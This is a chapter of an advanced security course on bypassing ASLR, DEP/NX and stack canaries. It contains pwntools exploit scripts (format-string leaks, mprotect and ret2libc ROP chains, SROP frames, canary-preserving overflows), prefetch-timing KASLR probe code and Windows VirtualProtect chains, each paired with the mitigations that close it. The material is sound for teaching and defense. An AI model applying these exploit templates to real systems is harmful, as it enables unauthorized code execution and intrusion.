---
corso: "Cybersecurity Masterclass"
fase: "Domain 6 — Mitigation Bypass"
modulo: "6.1"
titolo: "Mitigation Bypass Techniques"
versione: "glibc 2.34+, Linux 6.x, Windows 11 24H2, LLVM 18, GCC 14, ARMv8.6-A+"
livello: "Advanced"
prerequisiti:
  - "Domain 2 — Process memory layout, ASLR, DEP, W^X, seccomp"
  - "Domain 3 — Stack and heap exploitation primitives (buffer overflow, UAF, format string)"
  - "Domain 4 — Code-reuse techniques (ROP, JOP, SROP, COOP) and hardware-enforced CFI (CET, PAC)"
  - "Domain 5 — Kernel exploitation fundamentals and KASLR"
  - "Proficiency with pwntools, ROPgadget, one_gadget, GDB/GEF"
obiettivi:
  - "Construct ASLR bypass chains using partial pointer overwrites, information leaks, and side-channel derandomization"
  - "Build DEP/NX bypass payloads via mprotect/VirtualProtect ROP chains, return-to-libc, JIT spraying, and SROP"
  - "Defeat stack canaries through format-string leaks, fork-based brute force, and SEH overwrites"
  - "Exploit full-RELRO binaries via _IO_FILE vtable corruption (FSOP), exit_funcs pointer mangling, and link_map hijacking"
  - "Bypass fine-grained CFI (LLVM cfi-vcall, XFG, PAC) through COOP chains, valid-target-set analysis, and signing-gadget discovery"
tag: [security, exploitation, ASLR, DEP, NX, canary, RELRO, CFI, PAC, CET, mitigation-bypass, ROP, SROP, FSOP, COOP]
---

# Domain 6 — Mitigation Bypass Techniques

> **Learning objectives.** After completing this chapter you will be able to: (1) identify and exploit the weakest link in each major mitigation (ASLR entropy gaps, canary null-byte invariant, partial-RELRO GOT writability, coarse-grained CFI target sets); (2) chain an information leak with a code-reuse payload to achieve arbitrary code execution against a fully-hardened PIE binary; (3) construct SROP-based DEP bypass payloads using a single sigreturn gadget; (4) exploit _IO_FILE vtable constraints post-glibc-2.24 via `_IO_str_overflow` for FSOP under full RELRO; (5) evaluate the residual attack surface of ARM PAC + MTE + CET deployments and articulate which bypass classes each combination eliminates.

> **Scope.** ASLR bypass: partial pointer overwrites, information leaks (uninitialized memory, format strings, heap metadata), side-channel derandomization (prefetch, TLB, branch predictor), vsyscall as static target, entropy analysis, `/proc` leaks, AArch64 ASLR. DEP/NX bypass: `mprotect`/`mmap`-based shellcode, return-to-libc, `_dl_make_stack_executable`, Windows `VirtualProtect`/`VirtualAlloc`/`NtProtectVirtualMemory`, JIT spraying. Stack canary bypass: information leaks, fork-based brute force, SEH overwrite on Windows. RELRO bypass: partial RELRO GOT overwrites, full RELRO alternatives (`__malloc_hook`/`__free_hook` pre-2.34, `_IO_FILE` vtable exploitation, `exit_funcs`, `_dl_fini`, `link_map` corruption, `_fini_array`). CFI bypass: COOP with controlled `this` pointers, valid-target-set analysis, `std::function`/`std::bind` internals, JIT engine bypass, Rust `unsafe`. Additionally: KASLR bypass, shadow stack considerations, and defense-in-depth erosion analysis.
>
> **Orientation.** Each section follows a uniform structure: the mitigation being bypassed (with cross-reference to where it was defined), the bypass technique, the prerequisites the attacker needs, and the next-layer defense that closes the bypass. This chapter is the "adversary's response" to each defense; understanding it is necessary for a defender to evaluate which mitigations are load-bearing versus speed-bumps.
>
> **Prerequisites.** All previous domains. Specific dependencies are cross-referenced per section.

---

## 1. ASLR bypass

**Mitigation reference.** ASLR (Domain 2, Chapter 2A §5) randomizes executable, library, stack, heap, and vDSO positions per-`execve`.

### 1.1 Partial pointer overwrites

ASLR randomizes at page granularity (4 KB minimum). On x86_64, the bottom 12 bits of any page-aligned address are always zero. For allocations within a page (heap objects, stack locals), the offset within the page is deterministic even when the page base is randomized.

If the attacker can overwrite only the least-significant byte(s) of a pointer — a single-byte overflow or a type confusion that corrupts only a partial value — they can redirect the pointer within the same page (1 byte = 256 possible targets on the same page) or within a 64 KB region (2 bytes, preserving the upper randomized bits). This bypasses ASLR without any information leak, at the cost of reduced precision.

The technique is particularly effective for heap pointers where the offset between the corrupted pointer and the desired target (e.g., a different heap object on the same page) is small and predictable. For code pointers, a 2-byte overwrite gives 16 bits of control (65536 possible targets), which may be enough to land on a useful gadget within the same library page.

Probability of success depends on the randomization granularity and the number of "useful" targets within the addressable window. Against heap ASLR with 13 bits of entropy (Domain 2, Chapter 2A §5), a partial overwrite that preserves the upper bits faces minimal randomization.

The following illustrates a partial pointer overwrite on a heap-based function pointer. The attacker overwrites only the lowest two bytes of a saved code pointer, redirecting it within the same 64 KB region. Because the upper 6 bytes of the address are unchanged, no ASLR leak is needed — only knowledge of the relative offset between the current target and the desired target within that 64 KB window.

```python
from pwn import *

# Scenario: heap-based buffer overflow can overwrite the lowest 2 bytes
# of a function pointer stored immediately after the buffer.
# The function pointer currently holds ptr_to_normal_handler.
# We want to redirect it to ptr_to_win_function, which is at an offset
# of +0x42 from the current target, within the same page.

elf = ELF('./vuln_partial')
p = process('./vuln_partial')

# The overflow buffer is 64 bytes; the function pointer follows at offset 64.
# We only overwrite 2 bytes (the lowest 2 bytes of the pointer).
# Target offset within the page: 0x0742 (known from static analysis of the binary).
target_low_bytes = p16(0x0742)  # little-endian 2-byte value

payload = b'A' * 64 + target_low_bytes

p.sendline(payload)
p.interactive()
```

The success probability for a 2-byte partial overwrite is 1/16 when 4 bits of ASLR entropy fall within the overwritten range (a common scenario for libraries loaded near page-aligned bases). This makes it practical for repeated attempts against network daemons that respawn.

CVE-2018-6789 (Exim mail server heap overflow) is an example where a partial pointer overwrite was used as part of the exploitation chain. The attacker corrupted heap metadata with a controlled partial value, redirecting allocation to a location that allowed further corruption without needing a full ASLR leak.

### 1.2 Information leaks

The most common ASLR bypass: obtain a code or data address from the process's memory, compute the ASLR base, and derive all other addresses.

**Uninitialized memory.** Stack variables or heap allocations that are used before initialization may contain residual pointers from previous frames or objects. A stack frame's uninitialized local might contain a libc return address from a previous call; a recycled heap chunk might contain a freed object's vtable pointer. If the attacker can read this uninitialized data (via a bug that outputs it, or a format-string `%p`), they learn a code address.

Mitigation: `-ftrivial-auto-var-init=zero` (auto-initialize stack variables), `CONFIG_INIT_ON_ALLOC_DEFAULT_ON` (kernel heap), `MADV_WIPEONFORK` (heap post-fork).

**Format strings.** `%p` walks the stack and prints pointer values. On x86_64, the first six `%p` consume the register arguments (`rdi` through `r9`); subsequent ones read from the stack. The stack typically contains saved return addresses (libc code pointers), GOT-derived pointers, and the stack canary. A format-string vulnerability that leaks even a single libc address defeats ASLR for that library.

The following demonstrates a complete ASLR bypass via format string leak. The attacker sends a format string payload to leak a libc address from the stack, computes the libc base, then uses a known one-gadget offset to get a shell. This pattern — leak, compute base, redirect — is the canonical ASLR defeat workflow (cross-reference Domain 3, Chapter 3A §5 for format string vulnerability mechanics).

```python
from pwn import *

elf = ELF('./vuln_fmt')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Known offset: __libc_start_main_ret is typically at stack position 15
# on this binary (determined via testing: send %1$p, %2$p, ... %20$p
# and identify which offset contains a __libc_start_main+XX address).
LIBC_START_MAIN_RET_OFFSET = 15

# Known offset of __libc_start_main's return instruction from libc base
# (determined from: readelf -s libc.so.6 | grep __libc_start_main)
LIBC_START_MAIN_RET = libc.symbols['__libc_start_main'] + 243  # typical

# One-gadget offset (found via one_gadget tool on the target libc)
ONE_GADGET = 0xe3b01  # example offset, varies per libc build

p = process('./vuln_fmt')

# Step 1: Leak libc address via format string
p.sendline(f'%{LIBC_START_MAIN_RET_OFFSET}$p'.encode())
leak = int(p.recvline().strip(), 16)
log.info(f'Leaked __libc_start_main_ret: {hex(leak)}')

# Step 2: Compute libc base
libc_base = leak - LIBC_START_MAIN_RET
log.info(f'libc base: {hex(libc_base)}')

# Step 3: Compute one-gadget address
one_gadget_addr = libc_base + ONE_GADGET
log.info(f'one_gadget: {hex(one_gadget_addr)}')

# Step 4: Use the computed address in a second-stage payload
# (e.g., overwrite a GOT entry or return address with one_gadget_addr)
# ... second stage depends on the specific vulnerability ...
p.interactive()
```

**Heap metadata.** A freed chunk in ptmalloc2's unsorted bin has its `fd` and `bk` pointers set to addresses within `main_arena` (in libc's `.data` segment). If the attacker can read a freed chunk's `fd` or `bk` (via a UAF read, a heap buffer over-read, or a type confusion that interprets freed memory), they obtain a libc address. Similarly, a freed fastbin or tcache chunk's `fd`/`next` pointer points at another heap chunk — leaking a heap address.

Tcache safe-linking (glibc 2.32+) XOR-obfuscates the `next` pointer, requiring the attacker to also know the chunk's heap address to decode it — making a single leaked `next` pointer less useful. But the unsorted bin `fd`/`bk` pointers are not safe-linked and remain a reliable libc leak source.

The safe-linking decode formula is: `real_ptr = obfuscated_ptr ^ (chunk_addr >> 12)`. If the attacker knows (or can leak) the chunk's heap address, the decode is trivial:

```python
def decode_safe_link(obfuscated, chunk_addr):
    """Decode glibc 2.32+ tcache safe-linked pointer."""
    return obfuscated ^ (chunk_addr >> 12)

# Example: attacker leaked both values from a UAF read
obfuscated_next = 0x00005555deadbeef
chunk_heap_addr = 0x000055550000a000
real_next = decode_safe_link(obfuscated_next, chunk_heap_addr)
```

CVE-2021-3156 (Sudo heap-based buffer overflow, "Baron Samedit") is an illustrative case where a heap overflow was used to leak heap metadata. Although the primary exploitation path did not require an explicit ASLR leak (the service_user struct corruption provided a direct code-execution path), variants of the exploit demonstrated heap metadata leaking as an alternative approach.

### 1.3 Side-channel ASLR derandomization

When no direct information leak is available, the attacker may infer addresses through microarchitectural side channels:

**Prefetch timing.** The `prefetch` instruction's timing varies depending on whether the target address is mapped. An attacker can probe candidate ASLR-randomized addresses via `prefetch` and measure timing to determine which addresses have valid page-table entries. This has been demonstrated to derandomize KASLR (kernel ASLR) from user space.

The attack works because `prefetch` on a mapped address triggers a TLB fill (or hits the TLB), while `prefetch` on an unmapped address completes quickly without a page-table walk (the CPU recognizes the invalid address early). The timing difference is on the order of tens of nanoseconds — small but measurable with `RDTSC`. Gruss et al. (2016, "Prefetch Side-Channel Attacks: Bypassing SMAP and Kernel ASLR") demonstrated this against Linux KASLR, requiring only ~20ms to fully derandomize the kernel base.

The following C code demonstrates the core timing measurement used in prefetch-based KASLR derandomization:

```c
#include <stdint.h>
#include <x86intrin.h>

static inline uint64_t probe_address(volatile void *addr) {
    uint64_t t0, t1;
    unsigned int aux;

    t0 = __rdtscp(&aux);
    _mm_prefetch((const char *)addr, _MM_HINT_T0);
    _mm_mfence();
    t1 = __rdtscp(&aux);

    return t1 - t0;
}

/* Scan the kernel text region (0xffffffff80000000 to 0xffffffffc0000000)
 * at 2MB alignment (kernel text is mapped with 2MB pages).
 * The address with the lowest prefetch latency is likely the kernel base. */
void scan_kaslr(void) {
    uint64_t base;
    uint64_t min_time = UINT64_MAX;
    uint64_t best_base = 0;

    for (base = 0xffffffff80000000ULL;
         base < 0xffffffffc0000000ULL;
         base += 0x200000ULL) {  /* 2MB step */

        uint64_t total = 0;
        for (int i = 0; i < 1000; i++) {
            total += probe_address((void *)base);
        }
        uint64_t avg = total / 1000;

        if (avg < min_time) {
            min_time = avg;
            best_base = base;
        }
    }
    /* best_base is the probable kernel text base */
}
```

This technique was mitigated by KPTI (Kernel Page Table Isolation), which removes kernel page-table entries from user-mode page tables entirely, making kernel addresses unresolvable during user-mode execution. However, some kernel pages (the entry trampolines, per-CPU areas) must remain mapped in user-mode page tables and can still be probed.

**TLB timing.** TLB misses for mapped pages take longer than accesses that fault immediately on unmapped addresses (no page-table walk needed for the canonical-hole or wholly-unmapped regions). Measuring the fault latency for candidate addresses reveals the mapping layout.

**Branch predictor state.** The branch predictor learns patterns from executed branches. If the attacker can prime the predictor with a target address (from user space, in the case of kernel ASLR attacks) and then measure whether the prediction was taken, they can infer whether the target address corresponds to a real branch in kernel or library code. This is a variant of Spectre-v2-style branch-target injection, used for reconnaissance rather than data extraction.

**TSX-based probing.** Intel Transactional Synchronization Extensions (TSX) provided a unique side channel: a memory access inside a TSX transaction that causes a page fault aborts the transaction *without* delivering the fault to the OS. The attacker could probe arbitrary addresses inside a TSX transaction, observe whether the transaction aborted due to a page fault (unmapped) or succeeded (mapped), and never trigger a visible signal. This allowed silent ASLR probing without any detectable fault. TSX was disabled via microcode on many Intel CPUs after 2019 due to this and other security concerns (TAA, MDS), but remains enabled on some older systems.

These side channels typically require local code execution (the attacker is already running code on the target machine). They are most relevant for KASLR bypass (where direct information leaks are harder) and for breaking ASLR in browser sandboxes (where JavaScript provides a timing oracle).

Mitigations: KPTI (prevents TLB entries for kernel pages from being visible in user mode), kernel ASLR entropy increase, CPU microcode updates that limit speculative side-channel information flow, and site isolation in browsers.

### 1.4 Vsyscall as a static target

The vsyscall page (Domain 2, Chapter 2A §6.3) is mapped at the fixed address `0xFFFFFFFFFF600000` on x86_64. On kernels with `vsyscall=emulate` (the default), the page is not user-executable (the kernel emulates calls to the three known entry points by trapping the page fault). However, on older kernels with `vsyscall=native`, the page is genuinely executable at a known address.

On `vsyscall=native` (rare today), the attacker can use the three vsyscall entry points as known-address ROP gadgets, bypassing ASLR for the first step of a chain. The gadgets are limited (they perform specific syscalls and return) but can be useful for bootstrapping.

The three vsyscall entry points and their fixed addresses:

```
0xFFFFFFFFFF600000: gettimeofday
0xFFFFFFFFFF600400: time
0xFFFFFFFFFF600800: getcpu
```

Each entry point contains a `syscall; ret` sequence. The `ret` gadget at each of these addresses is usable as a stack pivot or chain continuation gadget even when the attacker has no other known code address. In the exploitation of CVE-2016-0728 (Linux keyring refcount overflow), early proof-of-concept code used the vsyscall `ret` gadget as a bootstrapping point before later variants used info-leak-based approaches.

On `vsyscall=emulate`, the page cannot be read (the emulation trap handles it), so gadget scanning fails. On `vsyscall=none`, the page is unmapped entirely.

### 1.5 Entropy analysis and residual weaknesses

The ASLR entropy on x86_64 (Domain 2, Chapter 2A §5):

| Region | Entropy | Implication |
|--------|---------|-------------|
| Stack | 22 bits | ~4 million positions; infeasible to brute-force in a single attempt but feasible against a fork-without-exec server over many attempts |
| mmap base | 28 bits (default) | ~256 million positions; sufficient against network brute-force |
| PIE binary | 28 bits | Same as mmap |
| Heap (brk) | 13 bits | ~8192 positions; dangerously low for scenarios where the attacker can probe repeatedly |
| vDSO | Piggybacks mmap | Same as mmap |

The heap's 13 bits of entropy is the weakest link. A service that leaks a heap address or allows repeated heap probing has minimal ASLR protection for heap-based attacks. The `/proc/sys/kernel/randomize_va_space` sysctl controls ASLR: 0 = off, 1 = stack/mmap/vDSO only, 2 = full (includes brk randomization).

Brute-force feasibility analysis: with 13 bits of heap entropy, an attacker probing over a network connection needs at most 8192 attempts. At one attempt per 10 milliseconds (typical for a local network), this takes ~82 seconds. At one attempt per 100ms (typical for a WAN connection), it takes ~14 minutes. Against a forking server that does not re-randomize on fork, the number drops to 1 (the address is deterministic across all children of the same parent).

For the stack's 22 bits (4 million positions), network brute-force at 100 attempts/second would take ~11 hours — marginal but plausible for a patient attacker against a high-value target. For the mmap region's 28 bits, brute-force at 100 attempts/second takes ~31 days — generally infeasible.

These calculations assume the attacker gets a reliable oracle (the service crashes on failure, succeeds on correct guess). If the service does not provide a distinguishable oracle (e.g., it crashes identically regardless of the address used), brute-force is impractical.

### 1.6 `/proc` leaks

`/proc/PID/maps` shows every VMA with its address range and pathname — a complete ASLR-defeating map. `/proc/PID/mem` allows reading the process's memory at any address. Both are restricted by ptrace access checks (Domain 2, Chapter 2B §7.4): same-UID access requires dumpability, and Yama scope restrictions apply.

The concern: a process reading its own `/proc/self/maps` or `/proc/self/mem` to learn its layout is legitimate; the risk is if an attacker can trigger this read (e.g., via a vulnerability in a web application that reads and outputs `/proc/self/maps` through an SSRF-like bug, or via a format-string bug that reads from a calculated stack offset pointing at a maps-line buffer).

On older kernels (pre-4.12, before Yama ptrace scope was widely enforced), any process running as the same UID could read another process's `/proc/PID/maps`, making ASLR ineffective against same-user attackers. Modern hardened configurations set `kernel.yama.ptrace_scope=1` or higher, restricting `/proc/PID/maps` access to direct parent processes (or root).

### 1.7 ASLR on AArch64

AArch64 ASLR entropy depends on `CONFIG_ARM64_VA_BITS` (39, 48, or 52). With 48-bit VA: mmap randomization is 24 bits (default, configurable up to 33), stack is 22 bits. Top Byte Ignore (TBI) means the top byte of pointers is metadata, so only bits 47 down to the page offset participate in ASLR.

MTE (Memory Tagging Extension) interacts with ASLR: the tag bits in the top nibble can confuse tools that interpret full pointer values, and ASLR entropy analysis must account for the tag bits being non-address.

PAC (Pointer Authentication Codes) provides an additional layer on AArch64: even if the attacker learns an address via ASLR bypass, pointers that are PAC-signed cannot be used directly — the attacker must also forge or strip the PAC. However, PAC does not replace ASLR; it complements it. An attacker who bypasses both ASLR (via leak) and PAC (via signing gadget or brute force, see §7) has the same position as an attacker who bypassed only ASLR on a non-PAC system.

The interaction between TBI, MTE, and PAC on AArch64 means that the "effective address" for ASLR purposes is a subset of the pointer's bits. On a system with 48-bit VA, TBI, MTE, and PAC all active, the pointer layout is roughly:

```
Bits 63-56: PAC (authentication code)
Bits 55-52: ignored (part of PAC or TBI)
Bits 51-48: MTE tag (4 bits, if MTE active)
Bits 47-12: virtual address (subject to ASLR)
Bits 11-0:  page offset (fixed, not randomized)
```

---

## 2. DEP/NX bypass

**Mitigation reference.** W^X / DEP / NX (Domain 2, Chapter 2A §10.2 `_PAGE_NX`; Domain 4 §16 defense stack).

### 2.1 `mprotect`-based shellcode execution

The attacker's ROP chain calls `mprotect(buffer_address, size, PROT_READ | PROT_WRITE | PROT_EXEC)` to make a data region executable, then jumps to shellcode placed in that region. This is the standard DEP bypass: use code reuse (ROP) to change permissions, then switch to injected code.

Prerequisites: control of the stack (for ROP), knowledge of the buffer address (ASLR bypass), and `mprotect` not blocked by seccomp.

The ROP chain for `mprotect` on x86_64 requires setting up three arguments: `rdi` = target address (page-aligned), `rsi` = size, `rdx` = permissions (7 = `PROT_READ|PROT_WRITE|PROT_EXEC`). Then the chain calls `mprotect` and returns to the now-executable shellcode. The following pwntools script constructs such a chain:

```python
from pwn import *

elf = ELF('./vuln_dep')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
rop = ROP(libc)

# Assume libc_base was obtained via a prior ASLR leak (§1.2)
libc_base = 0x7f0000000000  # placeholder; replace with leaked value

# Shellcode destination: a known writable buffer (e.g., .bss or heap)
shellcode_addr = elf.bss() + 0x100
shellcode_page = shellcode_addr & ~0xfff  # page-align

# Build the ROP chain:
# 1. mprotect(shellcode_page, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC)
# 2. Jump to shellcode_addr

rop.raw(rop.find_gadget(['pop rdi', 'ret'])[0] + libc_base)
rop.raw(shellcode_page)
rop.raw(rop.find_gadget(['pop rsi', 'ret'])[0] + libc_base)
rop.raw(0x1000)
rop.raw(rop.find_gadget(['pop rdx', 'ret'])[0] + libc_base)
rop.raw(7)  # PROT_READ | PROT_WRITE | PROT_EXEC
rop.raw(libc_base + libc.symbols['mprotect'])
rop.raw(shellcode_addr)  # after mprotect returns, jump to shellcode

# The payload: overflow buffer + canary + saved RBP + ROP chain
# Shellcode must already be placed at shellcode_addr (via a prior write)
payload = b'A' * OFFSET_TO_RET + rop.chain()
```

In assembly terms, the ROP chain's effect is equivalent to:

```asm
; x86_64 mprotect ROP equivalent
pop rdi             ; rdi = shellcode_page (page-aligned address)
ret
pop rsi             ; rsi = 0x1000 (page size)
ret
pop rdx             ; rdx = 7 (PROT_READ|PROT_WRITE|PROT_EXEC)
ret
call mprotect       ; mprotect(shellcode_page, 0x1000, 7)
jmp shellcode_addr  ; execute shellcode on the now-RWX page
```

Mitigations: seccomp filtering `mprotect` with `PROT_EXEC`, SELinux `execmem` denial (blocks `PROT_EXEC` on anonymous/private mappings), and the W^X audit (monitoring for processes that call `mprotect` with `PROT_EXEC` on previously non-executable pages).

### 2.2 `mmap` with `PROT_EXEC`

Alternatively, the ROP chain calls `mmap(NULL, size, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0)` to create a new RWX page, copies shellcode into it, and jumps there. Same mitigations as §2.1.

The `mmap` approach has a subtlety: `mmap` returns the address of the new mapping in `rax`. The ROP chain must capture this return value (typically by chaining a `mov rdi, rax; ret` gadget or equivalent) and then use it as the destination for a `memcpy` of the shellcode and the final jump target. This makes the chain longer but avoids the requirement of knowing a writable address in advance.

### 2.3 Return-to-libc

The attacker doesn't inject code at all: the ROP chain calls existing libc functions (`system("/bin/sh")`, `execve`, or a sequence of `open`/`read`/`write`). No executable-data pages are needed. This bypasses DEP entirely because no injected code executes.

The classic return-to-libc attack calls `system("/bin/sh")`. On x86_64, the attacker needs: the address of `system` in libc (obtained via ASLR leak), the address of the string `"/bin/sh"` in libc (it exists as a literal in most libc builds, findable via `strings -t x libc.so.6 | grep /bin/sh`), and a `pop rdi; ret` gadget to set the first argument:

```python
from pwn import *

elf = ELF('./vuln_ret2libc')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# After ASLR leak, compute libc_base
libc_base = leaked_addr - known_offset

system_addr = libc_base + libc.symbols['system']
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh\x00'))

# Find a pop rdi; ret gadget in libc
pop_rdi_ret = libc_base + 0x00023b6a  # offset varies per libc build
ret_gadget  = libc_base + 0x00022679  # bare ret, for stack alignment

# Payload: overflow + pop_rdi + "/bin/sh" + system
# Note: on Ubuntu x86_64, system() requires 16-byte stack alignment.
# An extra 'ret' gadget before system() ensures alignment.
payload  = b'A' * OFFSET_TO_RET
payload += p64(ret_gadget)      # stack alignment
payload += p64(pop_rdi_ret)     # pop rdi; ret
payload += p64(bin_sh_addr)     # rdi = "/bin/sh"
payload += p64(system_addr)     # call system("/bin/sh")
```

For more constrained scenarios where `execve` is available but `system` is blocked by seccomp, the attacker constructs a longer chain that sets `rdi` = path, `rsi` = argv, `rdx` = envp and calls `execve` directly. Sigreturn-Oriented Programming (SROP, cross-reference Domain 4 §7) simplifies this by using a single `sigreturn` gadget to set all registers simultaneously from a forged signal frame.

Mitigations: ASLR (hide libc's address), seccomp (block `execve`), CFI (constrain which libc functions can be reached from each call site).

### 2.4 `_dl_make_stack_executable`

The glibc dynamic linker contains a function `_dl_make_stack_executable` (in `elf/dl-execstack.c`) that calls `mprotect` on the stack with `PROT_EXEC`. It exists for legacy support: some programs (GCC nested functions with trampolines, some JNI implementations) need an executable stack at runtime. If the attacker can call this function (via ROP), the stack becomes executable and shellcode placed on it runs.

The function's address is in libc (ASLR-protected) and calling it requires `_dl_make_stack_executable_hook` to be set or `GL(dl_stack_flags)` to include `PF_X`. It is a niche target but appears in some exploits against programs that already link with trampoline support.

Internally, `_dl_make_stack_executable` does roughly:

```c
/* Simplified from glibc elf/dl-execstack.c */
int _dl_make_stack_executable(void **stack_endp) {
    /* Gets the stack's current end address and calls mprotect
     * to add PROT_EXEC to the stack pages */
    uintptr_t page = ((uintptr_t)*stack_endp) & ~(GLRO(dl_pagesize) - 1);
    if (mprotect((void *)page, GLRO(dl_pagesize),
                 PROT_READ | PROT_WRITE | PROT_EXEC) != 0)
        return errno;
    /* Update GL(dl_stack_flags) to reflect the new permissions */
    GL(dl_stack_flags) |= PF_X;
    return 0;
}
```

The attacker's ROP chain sets `rdi` to point to a stack address and calls `_dl_make_stack_executable`. The function then `mprotect`s the containing page with RWX permissions. The advantage over calling `mprotect` directly is that `_dl_make_stack_executable` handles the page-alignment and size calculation internally — the attacker only needs to provide a single pointer argument.

### 2.5 Windows DEP bypass

On Windows, the analogous bypass uses ROP chains that call:

**`VirtualProtect(address, size, PAGE_EXECUTE_READWRITE, &old_protect)`**: changes page permissions of an existing allocation.

**`VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)`**: allocates new RWX memory.

**`NtProtectVirtualMemory`**: the underlying NT syscall for `VirtualProtect`, usable when the attacker wants to avoid IAT-level hooks on `VirtualProtect`.

**`WriteProcessMemory`**: can write to another process's memory (or the current process's, passing `GetCurrentProcess()` as the handle). Combined with `VirtualProtect`, this allows writing shellcode to an existing code region.

The `VirtualProtect` ROP chain on Windows x64 is more complex than the Linux `mprotect` chain because of the Windows x64 calling convention (parameters in `rcx`, `rdx`, `r8`, `r9`, plus a 32-byte shadow space on the stack). A typical chain:

```asm
; Windows x64 VirtualProtect ROP chain (conceptual)
; VirtualProtect(lpAddress, dwSize, flNewProtect, lpflOldProtect)
; rcx = lpAddress (address of shellcode buffer)
; rdx = dwSize (size of region)
; r8  = flNewProtect (0x40 = PAGE_EXECUTE_READWRITE)
; r9  = lpflOldProtect (pointer to writable DWORD)

pop rcx             ; rcx = shellcode_address
ret
pop rdx             ; rdx = 0x1000
ret
pop r8              ; r8 = 0x40 (PAGE_EXECUTE_READWRITE)
ret
pop r9              ; r9 = writable_dword_addr (e.g., .data section)
ret
; Shadow space: 4 QWORDs of padding on the stack
jmp [IAT_VirtualProtect]
; After VirtualProtect returns, jump to shellcode_address
```

Windows mitigations: Arbitrary Code Guard (ACG, prevents dynamically-generated code pages), Code Integrity Guard (CIG, requires all executable pages to be backed by signed images), and the process-mitigation policies set via `SetProcessMitigationPolicy`.

ACG (introduced in Windows 10 Creators Update) prevents a process from allocating new executable memory (`VirtualAlloc` with `PAGE_EXECUTE_*`) or modifying existing code pages (`VirtualProtect` to add execute permission). Under ACG, the `VirtualProtect` and `VirtualAlloc` ROP chains fail at the kernel level. The attacker is forced into pure code-reuse (no shellcode injection) or must find a way to disable ACG first (which requires modifying process mitigation flags — a privileged operation).

### 2.6 JIT spraying

JIT (Just-In-Time) compilers in language runtimes (JavaScript V8, SpiderMonkey; Java HotSpot; .NET RyuJIT) generate executable code at runtime. The generated code lives in RWX (or W→X-toggled) pages. If the attacker can influence the JIT output (by crafting specific source code — JavaScript expressions, Java bytecode), they can embed byte sequences in the JIT output that, when jumped to at a controlled offset, form useful gadgets or shellcode.

The classic JIT spray (Blazakis, 2010): JavaScript expressions like `var x = 0x41414141 ^ 0x42424242 ^ ...` generate x86 XOR instructions whose immediate operands (0x41414141, etc.) are attacker-controlled. Jumping into the middle of these immediate operands reinterprets them as different instructions (shellcode).

To illustrate concretely, consider the x86 encoding of `XOR EAX, 0x41414141`:

```
35 41 41 41 41    ; XOR EAX, 0x41414141
```

If the JIT compiler generates a chain of these XOR instructions back-to-back:

```
35 41 41 41 41    ; XOR EAX, 0x41414141
35 42 42 42 42    ; XOR EAX, 0x42424242
35 43 43 43 43    ; XOR EAX, 0x43434343
```

Jumping to offset +1 (into the immediate operand) causes the CPU to decode:

```
41                ; (REX.B prefix on x86_64, or INC ECX on x86_32)
41 41 41          ; (further REX prefixes / INC ECX)
35 42 42 42 42    ; XOR EAX, 0x42424242
...
```

By carefully choosing the immediate values, the attacker controls the "hidden" instruction stream that the CPU sees when execution starts at an unintended offset. The JIT compiler placed these bytes in an executable page, so they run without any DEP violation.

Mitigations: constant blinding (XOR immediates with a random value before embedding, adding a runtime unblinding step), code randomization (inserting NOPs and reordering instructions in JIT output), RW→RX page permission toggling (the JIT page is writable only during code generation, not during execution), and CFI for JIT'd code (V8 and SpiderMonkey now implement CFI checks in JIT output).

### 2.7 Sigreturn-Oriented Programming (SROP) for DEP bypass

SROP (cross-reference Domain 4 §7 for the full technique) deserves mention here because it is one of the most efficient DEP bypasses. A single `sigreturn` gadget, combined with a forged signal frame on the stack, sets all registers to attacker-chosen values and then transfers execution to the address in the forged `rip` field. The attacker can set `rax` = `__NR_mprotect` (or `__NR_execve`), `rdi`/`rsi`/`rdx` to the appropriate arguments, and land on a `syscall` instruction — achieving a full `mprotect` or `execve` call with a single gadget rather than a multi-step ROP chain.

The signal frame is 296 bytes on x86_64. The attacker constructs it on the stack (or in a controlled buffer) with all register values set:

```python
from pwn import *

# SROP mprotect chain
context.arch = 'amd64'

SYSCALL_RET = libc_base + syscall_ret_offset  # address of 'syscall; ret'
SIGRETURN   = libc_base + sigreturn_offset    # address of 'mov rax, 15; syscall'

frame = SigreturnFrame()
frame.rax = constants.SYS_mprotect  # syscall number for mprotect
frame.rdi = shellcode_page          # address to make executable
frame.rsi = 0x1000                  # size
frame.rdx = 7                       # PROT_READ | PROT_WRITE | PROT_EXEC
frame.rsp = shellcode_addr          # stack pivot after sigreturn
frame.rip = SYSCALL_RET             # execute syscall instruction

payload  = b'A' * OFFSET_TO_RET
payload += p64(SIGRETURN)           # trigger sigreturn
payload += bytes(frame)             # the forged signal frame
```

This is far more compact than a traditional ROP chain and requires finding only one or two gadgets, making it effective even in binaries with limited ROP gadget availability.

---

## 3. Stack canary bypass

**Mitigation reference.** Stack canaries (Chapter 3A §2; Domain 4 §15).

### 3.1 Information leaks

The canary value can be leaked through any read primitive that reaches the canary's location:

The canary is on the stack (between locals and the saved return address). A format-string `%p` that reads enough stack slots will reach it. A buffer over-read (reading past the end of a buffer into the canary region) leaks it. Reading `/proc/self/mem` at the stack canary offset leaks it.

The canary is also stored in the TCB at `fs:0x28`. A read primitive targeting the TLS region (via a corruption that exposes TLS contents) leaks the master canary for all functions in the thread.

Once known, the attacker includes the correct canary value in their overflow payload, passing the epilogue check.

The following demonstrates a canary leak via format string, followed by a buffer overflow that includes the leaked canary:

```python
from pwn import *

p = process('./vuln_canary')

# Step 1: Leak the canary via format string
# On this binary, the canary is at stack offset 11 (determined empirically)
p.sendline(b'%11$p')
canary = int(p.recvline().strip(), 16)
log.info(f'Leaked canary: {hex(canary)}')

# Step 2: Construct overflow payload that preserves the canary
# Layout: [buffer (64 bytes)] [canary (8 bytes)] [saved RBP (8 bytes)] [return addr (8 bytes)]
payload  = b'A' * 64           # fill the buffer
payload += p64(canary)         # overwrite canary with its correct value
payload += b'B' * 8            # overwrite saved RBP (don't care)
payload += p64(win_function)   # overwrite return address
p.sendline(payload)

p.interactive()
```

